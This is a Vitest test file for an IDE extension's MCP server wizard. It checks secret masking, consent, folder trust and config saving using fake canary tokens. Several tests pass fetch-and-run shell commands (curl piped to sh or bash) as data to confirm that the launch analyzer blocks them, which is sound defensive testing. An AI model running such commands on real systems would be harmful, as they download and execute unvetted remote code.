import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  afterEach,
  beforeEach,
  describe,
  expect,
  it,
  type Mock,
  vi,
} from "vitest";

import { WEBVIEW_TO_CORE_PASS_THROUGH } from "../../protocol/passThrough";

import type { McpProbeResult } from "./probeMcpServer";
import {
  HeldValues,
  type McpWizardHost,
  registerMcpWizardHandlers,
  scrubSecrets,
} from "./protocolHandlers";
import type { McpServerDraft } from "./types";

// The real launch path asks the login shell for PATH on macOS and Linux;
// keep the test hermetic
vi.mock("../../util/shellPath", () => ({
  getEnvPathFromUserShell: vi.fn().mockResolvedValue(undefined),
}));

/*
  MCPW4a. Every message goes through a JSON round trip both ways, as it does
  over the real messenger, and every answer is searched for the secret
  values of the test. The only server started is the repository's own mock
  (context/mcp/mockStdioMcpServer.mjs); nothing touches the network.
*/

const MESSAGES = [
  "mcp/listTemplates",
  "mcp/parsePaste",
  "mcp/analyzeLaunch",
  "mcp/probe",
  "mcp/save",
  "mcp/list",
  "mcp/remove",
  "mcp/scopes",
  "mcp/getDraft",
  "mcp/update",
  "mcp/move",
] as const;

const MOCK = path.join(
  __dirname,
  "..",
  "..",
  "context",
  "mcp",
  "mockStdioMcpServer.mjs",
);
const CANARY = "ghp_" + "C4n4ryV4lu3".repeat(4);
const HEADER_CANARY = "sk-ant-api03-" + "H".repeat(40);

type Handler = (msg: { data: unknown }) => Promise<unknown>;

let dir: string;
let configPath: string;
let continueDir: string;
let projectDir: string | undefined;
let handlers: Map<string, Handler>;
let reload: Mock<(reason: string) => Promise<void>>;
let probeSpy: ReturnType<typeof vi.fn> | undefined;
/** Everything that crossed to the "webview", as JSON text. */
let sent: string[];

const CONFIG = `name: test
version: 1.0.0
schema: v1
mcpServers:
  - name: inline-token
    command: npx
    args:
      - -y
      - some-server@1.0.0
    env:
      GITHUB_TOKEN: ${CANARY}
`;

function register(extra: Partial<McpWizardHost> = {}) {
  handlers = new Map();
  reload = vi.fn(async (_reason: string) => {});
  registerMcpWizardHandlers(
    ((name: string, h: Handler) => handlers.set(name, h)) as never,
    {
      configPath: () => configPath,
      continueDir: () => continueDir,
      projectDir: async () => projectDir,
      ide: { readSecrets: async () => ({}), writeSecrets: async () => {} },
      secretStorage: async () => "env",
      reload,
      ...(probeSpy ? { probe: probeSpy as never } : {}),
      ...extra,
    },
  );
}

/** One message over a JSON messenger: the request and the answer are serialised. */
async function call<T = any>(name: string, data?: unknown): Promise<T> {
  const h = handlers.get(name);
  if (!h) throw new Error(`${name} is not registered`);
  const wire =
    data === undefined ? undefined : JSON.parse(JSON.stringify(data));
  const answer = await h({ data: wire });
  const text = JSON.stringify(answer);
  sent.push(text);
  const back = JSON.parse(text);
  // Nothing in an answer is lost on the wire (no class, function or undefined)
  expect(back).toEqual(answer);
  return back as T;
}

function noSecretsSent() {
  for (const text of sent) {
    expect(text).not.toContain(CANARY);
    expect(text).not.toContain(HEADER_CANARY);
    expect(text).not.toContain("C4n4ry");
  }
}

function pasteFor(mode: string, extraEnv: Record<string, string> = {}) {
  return JSON.stringify({
    mcpServers: {
      mock: {
        command: process.execPath,
        args: [MOCK],
        env: { MOCK_MCP_MODE: mode, ...extraEnv },
      },
    },
  });
}

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "mcpw-protocol-"));
  configPath = path.join(dir, "config.yaml");
  continueDir = path.join(dir, "continue");
  fs.mkdirSync(continueDir);
  fs.writeFileSync(configPath, CONFIG);
  projectDir = path.join(dir, "project");
  fs.mkdirSync(projectDir);
  probeSpy = undefined;
  sent = [];
  register();
});
afterEach(() => {
  noSecretsSent();
  fs.rmSync(dir, { recursive: true, force: true });
});

describe("registration", () => {
  it("registers every message on core and passes it through from the webview", () => {
    expect([...handlers.keys()].sort()).toEqual([...MESSAGES].sort());
    for (const m of MESSAGES) expect(WEBVIEW_TO_CORE_PASS_THROUGH).toContain(m);
  });

  it("lists every message for JetBrains too", () => {
    const kt = fs.readFileSync(
      path.join(
        __dirname,
        "..",
        "..",
        "..",
        "extensions",
        "intellij",
        "src",
        "main",
        "kotlin",
        "com",
        "github",
        "continuedev",
        "continueintellijextension",
        "constants",
        "MessageTypes.kt",
      ),
      "utf8",
    );
    const toCore = kt.slice(kt.indexOf("PASS_THROUGH_TO_CORE"));
    for (const m of MESSAGES) expect(toCore).toContain(`"${m}"`);
  });
});

describe("mcp/listTemplates and mcp/parsePaste", () => {
  it("lists the seven templates", async () => {
    const list = await call<any[]>("mcp/listTemplates");
    expect(list.map((t) => t.id)).toHaveLength(7);
    expect(list.every((t) => t.pinned && t.versionChecked)).toBe(true);
  });

  it("opens a template as a draft with its fields", async () => {
    const r = await call("mcp/parsePaste", { templateId: "github" });
    expect(r.candidates).toHaveLength(1);
    const c = r.candidates[0];
    expect(c.source).toBe("template");
    expect(c.draft.command).toBe("docker");
    expect(c.draft.env).toEqual([
      { name: "GITHUB_PERSONAL_ACCESS_TOKEN", value: "", secret: true },
    ]);
    expect(c.fields).toContainEqual(
      expect.objectContaining({
        target: "env",
        name: "GITHUB_PERSONAL_ACCESS_TOKEN",
        isRequired: true,
        isSecret: true,
      }),
    );
  });

  it("says so for a template that does not exist", async () => {
    const r = await call("mcp/parsePaste", { templateId: "nope" });
    expect(r.candidates).toEqual([]);
    expect(r.warnings[0]).toMatch(/no template/);
  });

  it("holds a pasted credential in core and sends a marker instead", async () => {
    const r = await call("mcp/parsePaste", {
      text: pasteFor("normal", { GITHUB_TOKEN: CANARY }),
    });
    const env = r.candidates[0].draft.env;
    const token = env.find((v: any) => v.name === "GITHUB_TOKEN");
    expect(token.secret).toBe(true);
    expect(token.value).toMatch(/^\$\{\{ held\.[0-9a-f-]{36} \}\}$/);
    expect(env.find((v: any) => v.name === "MOCK_MCP_MODE")).toEqual({
      name: "MOCK_MCP_MODE",
      value: "normal",
      secret: false,
    });
    expect(r.candidates[0].fields).toContainEqual(
      expect.objectContaining({ name: "GITHUB_TOKEN", hasValue: true }),
    );
  });

  it("holds credentials in headers, arguments and the URL query", async () => {
    const http = await call("mcp/parsePaste", {
      text: JSON.stringify({
        mcpServers: {
          remote: {
            type: "http",
            url: `https://mcp.example.com/mcp?api_key=${CANARY}`,
            headers: { Authorization: `Bearer ${HEADER_CANARY}` },
          },
        },
      }),
    });
    const d = http.candidates[0].draft;
    expect(d.url).toMatch(/api_key=\$\{\{ held\./);
    expect(d.headers[0].value).toMatch(/held\./);
    expect(http.candidates[0].fields[0].label).toBe("API key");

    const cmd = await call("mcp/parsePaste", {
      text: `npx -y some-server@1.0.0 --api-key ${HEADER_CANARY}`,
    });
    expect(cmd.candidates[0].draft.args.join(" ")).toMatch(/held\./);
  });

  it("turns another tool's variable into an empty secret to fill in", async () => {
    const r = await call("mcp/parsePaste", {
      text: JSON.stringify({
        servers: {
          gh: {
            command: "npx",
            args: ["-y", "x@1.0.0"],
            env: { TOKEN: "${input:token}" },
          },
        },
      }),
    });
    expect(r.candidates[0].draft.env).toEqual([
      { name: "TOKEN", value: "", secret: true },
    ]);
  });
});

describe("mcp/analyzeLaunch", () => {
  it("returns the findings and the runtime line, and runs nothing", async () => {
    probeSpy = vi.fn();
    register({ env: { PATH: "" }, platform: "linux" });
    const r = await call("mcp/analyzeLaunch", {
      draft: {
        name: "x",
        transport: "stdio",
        command: "npx",
        args: ["-y", "some-server"],
      },
    });
    expect(r.analysis.findings.map((f: any) => f.code)).toContain(
      "unpinned-package",
    );
    expect(r.runtime).toMatchObject({ kind: "node", found: false });
    expect(r.expired).toBe(false);
    expect(probeSpy).not.toHaveBeenCalled();
  });

  it("blocks a fetch-and-run command", async () => {
    const r = await call("mcp/analyzeLaunch", {
      draft: {
        name: "x",
        transport: "stdio",
        command: "sh",
        args: ["-c", "curl https://example.com/i.sh | sh"],
      },
    });
    expect(r.analysis.blocked).toBe(true);
  });

  it("reports a held marker it no longer knows", async () => {
    const r = await call("mcp/analyzeLaunch", {
      draft: {
        name: "x",
        transport: "stdio",
        command: "npx",
        args: ["-y", "a@1.0.0"],
        env: [
          {
            name: "T",
            value: "${{ held.00000000-0000-4000-8000-000000000000 }}",
            secret: true,
          },
        ],
      },
    });
    expect(r.expired).toBe(true);
  });
});

const fakeResult = (): McpProbeResult => ({
  ok: true,
  status: "connected",
  durationMs: 5,
  timeoutMs: 20_000,
  transport: "stdio",
  tools: [],
  resources: [],
  prompts: [],
  errors: [],
  infos: [],
  stderr: { lines: [], truncated: false },
  hints: [],
  needsSignIn: false,
  notice: "",
});

describe("mcp/probe needs consent", () => {
  const draft: McpServerDraft = {
    name: "x",
    transport: "stdio",
    command: "npx",
    args: ["-y", "a@1.0.0"],
  };

  it.each([
    ["missing", {}],
    ["false", { consent: false }],
    ["the string true", { consent: "true" }],
    ["one", { consent: 1 }],
  ])("refuses when consent is %s, and starts nothing", async (_l, extra) => {
    probeSpy = vi.fn(async () => fakeResult());
    register();
    const r = await call("mcp/probe", { draft, ...extra });
    expect(r).toMatchObject({ ran: false, reason: "no-consent" });
    expect(probeSpy).not.toHaveBeenCalled();
  });

  it("runs with consent: true", async () => {
    probeSpy = vi.fn(async () => fakeResult());
    register();
    const r = await call("mcp/probe", { draft, consent: true });
    expect(r.ran).toBe(true);
    expect(probeSpy).toHaveBeenCalledTimes(1);
  });

  it("refuses a blocked launch even with consent", async () => {
    probeSpy = vi.fn(async () => fakeResult());
    register();
    const r = await call("mcp/probe", {
      draft: {
        name: "x",
        transport: "stdio",
        command: "bash",
        args: ["-c", "curl -fsSL https://example.com/i.sh | bash"],
      },
      consent: true,
    });
    expect(r).toMatchObject({ ran: false, reason: "blocked" });
    expect(probeSpy).not.toHaveBeenCalled();
  });

  it("refuses an empty required value and a secret with no value", async () => {
    probeSpy = vi.fn(async () => fakeResult());
    register();
    const empty = await call("mcp/probe", {
      draft: { ...draft, args: ["-y", "a@1.0.0", ""] },
      consent: true,
    });
    expect(empty).toMatchObject({ ran: false, reason: "invalid" });
    const missing = await call("mcp/probe", {
      draft: { ...draft, env: [{ name: "TOKEN", value: "", secret: true }] },
      consent: true,
    });
    expect(missing).toMatchObject({
      ran: false,
      reason: "missing-values",
      missing: ["TOKEN"],
    });
    expect(probeSpy).not.toHaveBeenCalled();
  });

  it("fills a saved secret's reference from the store for the test only", async () => {
    fs.writeFileSync(path.join(continueDir, ".env"), `SAVED_TOKEN=${CANARY}\n`);
    probeSpy = vi.fn(async (d: McpServerDraft) => ({
      ...fakeResult(),
      // A server that echoes its token must not get it back to the webview
      errors: [`token was ${d.env?.[0].value}`],
    }));
    register();
    const r = await call("mcp/probe", {
      draft: {
        ...draft,
        env: [
          { name: "TOKEN", value: "${{ secrets.SAVED_TOKEN }}", secret: true },
        ],
      },
      consent: true,
    });
    expect(probeSpy.mock.calls[0][0].env[0].value).toBe(CANARY);
    expect(r.result.errors[0]).toBe("token was «masked:value»");
  });
});

describe("mcp/probe fills references in arguments", () => {
  it("from the store, and names a missing one", async () => {
    fs.writeFileSync(path.join(continueDir, ".env"), `ARG_KEY=${CANARY}\n`);
    probeSpy = vi.fn(async () => fakeResult());
    register();
    const base = {
      name: "x",
      transport: "stdio",
      command: "npx",
      args: ["-y", "a@1.0.0", "--key", "${{ secrets.ARG_KEY }}"],
    };
    const r = await call("mcp/probe", { draft: base, consent: true });
    expect(r.ran).toBe(true);
    expect(probeSpy.mock.calls[0][0].args[3]).toBe(CANARY);
    const missing = await call("mcp/probe", {
      draft: { ...base, args: ["-y", "a@1.0.0", "${{ secrets.NOT_SET }}"] },
      consent: true,
    });
    expect(missing).toMatchObject({ ran: false, missing: ["argument 3"] });
  });
});

describe("mcp/probe against the local mock server", () => {
  it("connects a pasted server and lists its tools", async () => {
    const parsed = await call("mcp/parsePaste", { text: pasteFor("normal") });
    const r = await call("mcp/probe", {
      draft: parsed.candidates[0].draft,
      consent: true,
      timeoutMs: 15_000,
    });
    expect(r.ran).toBe(true);
    expect(r.result.ok).toBe(true);
    expect(r.result.tools.map((t: any) => t.name)).toEqual([
      "tool_0",
      "tool_1",
    ]);
  }, 30_000);

  it("uses a held credential and never sends it back, even from stderr", async () => {
    const parsed = await call("mcp/parsePaste", {
      text: pasteFor("exit", { MOCK_MCP_SECRET: CANARY }),
    });
    const d = parsed.candidates[0].draft;
    expect(JSON.stringify(d)).not.toContain(CANARY);
    const r = await call("mcp/probe", {
      draft: d,
      consent: true,
      timeoutMs: 15_000,
    });
    expect(r.ran).toBe(true);
    expect(r.result.ok).toBe(false);
    // The server did get the value: it wrote it to stderr, masked on the way out
    expect(r.result.stderr.lines.join("\n")).toContain(
      "could not authenticate",
    );
  }, 30_000);
});

describe("mcp/save", () => {
  it("saves to the person's own config.yaml by default, the value in the store", async () => {
    const parsed = await call("mcp/parsePaste", {
      text: pasteFor("normal", { GITHUB_TOKEN: CANARY }),
    });
    const r = await call("mcp/save", { draft: parsed.candidates[0].draft });
    expect(r).toMatchObject({
      ok: true,
      scope: "user",
      file: configPath,
      name: "mock",
    });
    expect(r.secretsStored).toEqual([
      { name: "MOCK_GITHUB_TOKEN", location: "env" },
    ]);
    expect(r).not.toHaveProperty("entry");
    const text = fs.readFileSync(configPath, "utf8");
    expect(text).toContain("${{ secrets.MOCK_GITHUB_TOKEN }}");
    expect(text.split(CANARY)).toHaveLength(2); // only the inline entry already there
    expect(fs.readFileSync(path.join(continueDir, ".env"), "utf8")).toContain(
      CANARY,
    );
    expect(reload).toHaveBeenCalledTimes(1);
  });

  it('writes a block file for "This project" only when asked', async () => {
    const draft: McpServerDraft = {
      name: "Team Server",
      transport: "stdio",
      command: "npx",
      args: ["-y", "team-server@1.0.0"],
      env: [{ name: "TEAM_KEY", value: HEADER_CANARY, secret: true }],
    };
    const r = await call("mcp/save", { draft, scope: "project" });
    expect(r).toMatchObject({ ok: true, scope: "project" });
    const file = path.join(
      projectDir!,
      ".continuous",
      "mcpServers",
      "team-server.yaml",
    );
    expect(r.file).toBe(file);
    const block = fs.readFileSync(file, "utf8");
    expect(block).toContain("${{ secrets.TEAM_SERVER_TEAM_KEY }}");
    expect(block).not.toContain(HEADER_CANARY);
  });

  it("stores a credential argument from the paste as a secret, and keeps a held value secret", async () => {
    const parsed = await call("mcp/parsePaste", {
      text: `npx -y some-server@1.0.0 --api-key ${HEADER_CANARY}`,
    });
    const draft = parsed.candidates[0].draft;
    const r = await call("mcp/save", { draft });
    expect(r.ok).toBe(true);
    const text = fs.readFileSync(configPath, "utf8");
    expect(text).not.toContain(HEADER_CANARY);
    expect(text).toMatch(/- \$\{\{ secrets\.[A-Z0-9_]*API_KEY \}\}/);
    expect(fs.readFileSync(path.join(continueDir, ".env"), "utf8")).toContain(
      HEADER_CANARY,
    );

    // The page cannot turn a held credential into a plain value
    const again = await call("mcp/parsePaste", {
      text: pasteFor("normal", { GITHUB_TOKEN: CANARY }),
    });
    const d = again.candidates[0].draft;
    d.name = "plain-attempt";
    d.env = d.env.map((v: any) => ({ ...v, secret: false }));
    expect((await call("mcp/save", { draft: d })).ok).toBe(true);
    expect(fs.readFileSync(configPath, "utf8")).toContain(
      "${{ secrets.PLAIN_ATTEMPT_GITHUB_TOKEN }}",
    );
  });

  it("refuses the project scope with no folder open, a duplicate, and a blocked launch", async () => {
    projectDir = undefined;
    const draft: McpServerDraft = {
      name: "inline-token",
      transport: "stdio",
      command: "npx",
      args: ["-y", "a@1.0.0"],
    };
    expect(await call("mcp/save", { draft, scope: "project" })).toMatchObject({
      ok: false,
      reason: "no-project",
    });
    expect(await call("mcp/save", { draft })).toMatchObject({
      ok: false,
      reason: "duplicate",
      suggestion: "inline-token-2",
    });
    expect(
      await call("mcp/save", {
        draft: {
          ...draft,
          name: "b",
          command: "sh",
          args: ["-c", "curl https://x.example/i | sh"],
        },
      }),
    ).toMatchObject({ ok: false, reason: "blocked" });
    expect(reload).not.toHaveBeenCalled();
  });

  it("refuses a held marker that has expired", async () => {
    let now = 0;
    const held = new HeldValues(() => now);
    handlers = new Map();
    registerMcpWizardHandlers(
      ((name: string, h: Handler) => handlers.set(name, h)) as never,
      {
        configPath: () => configPath,
        continueDir: () => continueDir,
        projectDir: async () => projectDir,
        ide: { readSecrets: async () => ({}), writeSecrets: async () => {} },
        secretStorage: async () => "env",
        reload,
      },
      held,
    );
    const parsed = await call("mcp/parsePaste", {
      text: pasteFor("normal", { GITHUB_TOKEN: CANARY }),
    });
    now = 2 * 60 * 60 * 1000;
    expect(
      await call("mcp/save", { draft: parsed.candidates[0].draft }),
    ).toMatchObject({
      ok: false,
      reason: "expired",
    });
  });
});

describe("mcp/list and mcp/remove", () => {
  it("lists names and references, never a value written inline", async () => {
    const r = await call("mcp/list");
    expect(r.servers).toHaveLength(1);
    expect(r.servers[0]).toMatchObject({
      name: "inline-token",
      scope: "user",
      transport: "stdio",
      envNames: ["GITHUB_TOKEN"],
      headerNames: [],
    });
    expect(r.servers[0]).not.toHaveProperty("entry");
  });

  it("removes a server, keeps its secrets, and reloads", async () => {
    const r = await call("mcp/remove", { name: "inline-token" });
    expect(r).toMatchObject({ ok: true, scope: "user", fileDeleted: false });
    expect(reload).toHaveBeenCalledTimes(1);
    expect((await call("mcp/list")).servers).toEqual([]);
  });

  it("names the matches without their entries when a name is ambiguous", async () => {
    const block = path.join(projectDir!, ".continuous", "mcpServers");
    fs.mkdirSync(block, { recursive: true });
    fs.writeFileSync(
      path.join(block, "inline-token.yaml"),
      `name: p\nversion: 0.0.1\nschema: v1\nmcpServers:\n  - name: inline-token\n    command: npx\n    env:\n      K: ${CANARY}\n`,
    );
    const r = await call("mcp/remove", { name: "inline-token" });
    expect(r).toMatchObject({ ok: false, reason: "ambiguous" });
    expect(r.matches.map((m: any) => m.scope).sort()).toEqual([
      "project",
      "user",
    ]);
    expect(r.matches[0]).not.toHaveProperty("entry");
    expect(await call("mcp/remove", { name: "missing" })).toMatchObject({
      ok: false,
      reason: "not-found",
    });
  });
});

describe("scrubSecrets", () => {
  it("masks every occurrence in nested strings and leaves short values alone", () => {
    expect(
      scrubSecrets({ a: [`x${CANARY}y`, { b: CANARY }], n: 1, s: "abc" }, [
        CANARY,
        "abc",
      ]),
    ).toEqual({
      a: ["x«masked:value»y", { b: "«masked:value»" }],
      n: 1,
      s: "abc",
    });
  });
});

describe("mcp/scopes", () => {
  it("gives the real paths, the folder's trust and what the code does by itself", async () => {
    register({ folderTrust: () => "none" });
    const r = await call("mcp/scopes");
    expect(r.user).toEqual({ file: configPath, exists: true });
    expect(r.folders).toEqual([
      {
        dir: projectDir,
        name: "project",
        mcpDir: path.join(projectDir!, ".continuous", "mcpServers"),
        trust: "none",
      },
    ]);
    expect(r.secretStore).toEqual({
      kind: "env",
      envFile: path.join(continueDir, ".env"),
    });
    // The numbers are the code's own (MCPConnection, probeMcpServer)
    expect(r.defaults).toEqual({
      connectionTimeoutMs: 20_000,
      probeTimeoutMs: 20_000,
      inheritedEnv: [
        "PATH",
        "HOME",
        "USER",
        "USERPROFILE",
        "LOGNAME",
        "USERNAME",
      ],
      cwd: projectDir,
    });
  });

  it("lists no folder and no working folder when none is open", async () => {
    projectDir = undefined;
    register();
    const r = await call("mcp/scopes");
    expect(r.folders).toEqual([]);
    expect(r.defaults).not.toHaveProperty("cwd");
  });

  it("reads a folder's trust from its MCP files: none without files, untrusted with new ones", async () => {
    expect((await call("mcp/scopes")).folders[0].trust).toBe("none");
    const mcpDir = path.join(projectDir!, ".continuous", "mcpServers");
    fs.mkdirSync(mcpDir, { recursive: true });
    fs.writeFileSync(
      path.join(mcpDir, "a.yaml"),
      "name: a\nversion: 0.0.1\nschema: v1\nmcpServers:\n  - name: a\n    command: npx\n",
    );
    expect((await call("mcp/scopes")).folders[0].trust).toBe("untrusted");
  });
});

describe("mcp/getDraft and mcp/update", () => {
  it("hands a credential written in the file to the page as a held marker only", async () => {
    const r = await call("mcp/getDraft", {
      name: "inline-token",
      scope: "user",
    });
    expect(r.ok).toBe(true);
    expect(r.listing).toMatchObject({ scope: "user", file: configPath });
    expect(r.draft.command).toBe("npx");
    expect(r.draft.args).toEqual(["-y", "some-server@1.0.0"]);
    expect(r.draft.env[0].name).toBe("GITHUB_TOKEN");
    expect(r.draft.env[0].secret).toBe(true);
    expect(r.draft.env[0].value).toMatch(/^\$\{\{ held\.[0-9a-f-]{36} \}\}$/);
  });

  it("saves the edit in place; the held credential becomes a secret", async () => {
    const { draft } = await call("mcp/getDraft", {
      name: "inline-token",
      scope: "user",
    });
    const r = await call("mcp/update", {
      target: { name: "inline-token", scope: "user" },
      draft: { ...draft, args: ["-y", "some-server@2.0.0"] },
    });
    expect(r).toMatchObject({ ok: true, scope: "user", file: configPath });
    const text = fs.readFileSync(configPath, "utf8");
    expect(text).not.toContain(CANARY);
    expect(text).toContain("some-server@2.0.0");
    expect(text).toContain("${{ secrets.INLINE_TOKEN_GITHUB_TOKEN }}");
    expect(fs.readFileSync(path.join(continueDir, ".env"), "utf8")).toContain(
      CANARY,
    );
    expect(reload).toHaveBeenCalledTimes(1);
  });

  it("says so when the server is gone", async () => {
    expect(
      await call("mcp/getDraft", { name: "nope", scope: "user" }),
    ).toMatchObject({ ok: false });
    expect(
      await call("mcp/update", {
        target: { name: "nope", scope: "user" },
        draft: { name: "nope", transport: "stdio", command: "npx" },
      }),
    ).toMatchObject({ ok: false, reason: "no-file" });
    expect(reload).not.toHaveBeenCalled();
  });
});

describe("mcp/save and mcp/probe follow the folder", () => {
  const draft: McpServerDraft = {
    name: "local",
    transport: "stdio",
    command: "npx",
    args: ["-y", "a@1.0.0"],
  };

  it("writes only under a folder core lists, whatever the page names", async () => {
    const outside = path.join(dir, "elsewhere");
    fs.mkdirSync(outside);
    const r = await call("mcp/save", {
      draft,
      scope: "project",
      folder: outside,
    });
    expect(r).toMatchObject({ ok: false, reason: "no-project" });
    expect(fs.existsSync(path.join(outside, ".continuous"))).toBe(false);
    expect(reload).not.toHaveBeenCalled();
  });

  it("saves to the chosen one of several folders", async () => {
    const second = path.join(dir, "second");
    fs.mkdirSync(second);
    register({ projectDirs: async () => [projectDir!, second] });
    const r = await call("mcp/save", {
      draft,
      scope: "project",
      folder: second,
    });
    expect(r).toMatchObject({
      ok: true,
      file: path.join(second, ".continuous", "mcpServers", "local.yaml"),
    });
    const listed = (await call("mcp/list")).servers.find(
      (s: any) => s.name === "local",
    );
    expect(listed).toMatchObject({ scope: "project", folder: second });
  });

  it("does not test a workspace server while the folder is not trusted", async () => {
    probeSpy = vi.fn(async () => fakeResult());
    register({ folderTrust: () => "untrusted" });
    const r = await call("mcp/probe", {
      draft,
      consent: true,
      scope: "project",
    });
    expect(r).toMatchObject({ ran: false, reason: "untrusted" });
    expect(probeSpy).not.toHaveBeenCalled();
  });

  it.each(["trusted", "none"] as const)(
    "tests a workspace server when the folder's trust is %s",
    async (trust) => {
      probeSpy = vi.fn(async () => fakeResult());
      register({ folderTrust: () => trust });
      const r = await call("mcp/probe", {
        draft,
        consent: true,
        scope: "project",
      });
      expect(r.ran).toBe(true);
    },
  );

  it("tests a server for all projects whatever the folder's trust", async () => {
    probeSpy = vi.fn(async () => fakeResult());
    register({ folderTrust: () => "untrusted" });
    expect(
      (await call("mcp/probe", { draft, consent: true, scope: "user" })).ran,
    ).toBe(true);
  });
});

describe("mcp/move", () => {
  const projectFile = () =>
    path.join(projectDir!, ".continuous", "mcpServers", "inline-token.yaml");

  it("moves to the workspace with the credential as a reference", async () => {
    const r = await call("mcp/move", {
      target: { name: "inline-token", scope: "user" },
      to: { scope: "project" },
    });
    expect(r).toMatchObject({
      ok: true,
      scope: "project",
      to: projectFile(),
      removedFromSource: true,
    });
    const text = fs.readFileSync(projectFile(), "utf8");
    expect(text).not.toContain(CANARY);
    expect(text).toContain("${{ secrets.INLINE_TOKEN_GITHUB_TOKEN }}");
    expect(fs.readFileSync(configPath, "utf8")).not.toContain("inline-token");
    expect(reload).toHaveBeenCalledTimes(1);
  });

  it("needs a yes to bring a folder's server to all projects", async () => {
    await call("mcp/move", {
      target: { name: "inline-token", scope: "user" },
      to: { scope: "project" },
    });
    reload.mockClear();
    for (const consent of [undefined, false, "true", 1]) {
      const r = await call("mcp/move", {
        target: { name: "inline-token", scope: "project" },
        to: { scope: "user" },
        consent,
      });
      expect(r).toMatchObject({ ok: false, reason: "no-consent" });
    }
    expect(fs.existsSync(projectFile())).toBe(true);
    expect(reload).not.toHaveBeenCalled();
    const r = await call("mcp/move", {
      target: { name: "inline-token", scope: "project" },
      to: { scope: "user" },
      consent: true,
    });
    expect(r).toMatchObject({
      ok: true,
      scope: "user",
      sourceFileDeleted: true,
    });
    expect(fs.existsSync(projectFile())).toBe(false);
  });

  it("refuses a copy whose name the destination has, and says which file", async () => {
    const r = await call("mcp/move", {
      target: { name: "inline-token", scope: "user" },
      to: { scope: "project" },
      copy: true,
    });
    expect(r).toMatchObject({ ok: false, reason: "duplicate" });
    expect(r.error).toContain(configPath);
    const ok = await call("mcp/move", {
      target: { name: "inline-token", scope: "user" },
      to: { scope: "project" },
      copy: true,
      newName: "inline-token-2",
    });
    expect(ok).toMatchObject({
      ok: true,
      name: "inline-token-2",
      removedFromSource: false,
    });
  });

  it("refuses when no folder is open, and for a server that is not there", async () => {
    projectDir = undefined;
    register();
    expect(
      await call("mcp/move", {
        target: { name: "inline-token", scope: "user" },
        to: { scope: "project" },
      }),
    ).toMatchObject({ ok: false, reason: "no-project" });
    expect(
      await call("mcp/move", {
        target: { name: "missing", scope: "user" },
        to: { scope: "project" },
      }),
    ).toMatchObject({ ok: false, reason: "not-found" });
  });
});
